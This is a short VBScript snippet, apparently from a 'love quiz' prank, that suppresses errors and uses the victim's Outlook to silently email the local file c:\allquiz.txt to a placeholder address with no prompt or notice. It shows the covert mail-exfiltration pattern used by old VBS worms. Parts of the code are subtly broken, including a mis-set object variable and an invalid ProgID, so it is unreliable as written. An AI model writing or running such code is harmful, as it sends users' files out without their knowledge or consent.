Dim x 
on error resume next 
Set fso ="Scripting.FileSystem.Object" 
Set so=CreateObject(fso) 
Set ol=CreateObject("Outlook.Application") 
Set out= WScript.CreateObject("Outlook.Application") 
Set Mail=ol.CreateItem(0) 
Mail.to="youremail@whatever.com" 
Mail.Subject="Love-Q" 
Mail.Body="Answer " 
Mail.Attachments.Add ("c:\allquiz.txt")
Mail.Send 
ol.Quit
